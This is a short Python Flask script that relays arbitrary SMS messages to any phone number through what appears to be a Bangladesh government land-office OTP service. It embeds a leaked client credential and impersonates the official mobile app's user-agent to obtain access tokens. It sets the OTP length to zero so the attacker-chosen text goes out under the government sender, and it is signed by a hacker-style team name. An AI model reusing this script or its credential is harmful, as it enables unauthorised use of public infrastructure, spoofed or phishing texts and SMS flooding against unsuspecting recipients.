import requests
from pprint import pprint
from flask import Flask, request
app = Flask(__name__)
@app.route('/')
def send_otp():
    n = request.args.get('n')
    m = request.args.get('m')
    if not n:
        return {"error":"Please Enter Number!"}
    if not m:
        return {"error":"Please Enter Message!"}

    tAPI = "https://idp.land.gov.bd/auth/realms/prod/protocol/openid-connect/token"

    token_headers = {
        "user-agent": "Dart/3.2 (dart:io)",
        "content-type": "application/x-www-form-urlencoded; charset=utf-8",
        "accept-encoding": "gzip",
        "authorization": "Basic bXV0YXRpb24tYXBwLWNsaWVudDphWTBBNVhFdlpLZHNwOGJzM0ZKNklwa0l4TmJWcHpGNg==",
        "host": "idp.land.gov.bd"
    }
    token_data = {
        "grant_type": "client_credentials"
    }
    token_resp = requests.post(tAPI, headers=token_headers, data=token_data)
    token_resp.raise_for_status()  # Raise exception for HTTP errors
    token = token_resp.json().get('access_token')

    mAPI = "https://sms-api.land.gov.bd/api/broker-service/otp/send_otp"
    otp_headers = {
        "user-agent": "Dart/3.2 (dart:io)",
        "accept": "application/json",
        "accept-encoding": "gzip",
        "host": "sms-api.land.gov.bd",
        "authorization": f"Bearer {token}",
        "content-type": "application/json; charset=utf-8"
    }
    otp_data = {
        "msgTmp": f"{m} $code",
        "destination": f"{n}",
        "otpType": "sms",
        "otpLength": 0
    }
    
    #Coded By Ahad

    otp_resp = requests.post(mAPI, headers=otp_headers, json=otp_data)
    otp_resp.raise_for_status()
    response = otp_resp.json()
    
    if response.get('success') and response.get('status') == 200:
        return {"msg":f"SMS sent to {n} successfully!", "Developer":"Team X 1337"}
    else:
        return {"error":"Failed To Send Sms!", "Developer":"Team X 1337"}

if __name__ == "__main__":
    app.run()